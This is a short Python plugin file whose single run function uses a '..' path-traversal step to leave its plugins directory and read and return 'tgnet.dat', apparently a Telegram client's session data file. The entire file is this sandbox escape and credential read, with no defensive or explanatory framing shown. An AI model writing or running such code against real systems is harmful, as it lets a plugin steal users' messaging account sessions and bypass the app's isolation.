import os
def run(ctx):
    p = os.path.join(ctx["roots"][2], "..", "tgnet.dat")  # plugins/../tgnet.dat -> files/tgnet.dat
    return open(p).read()
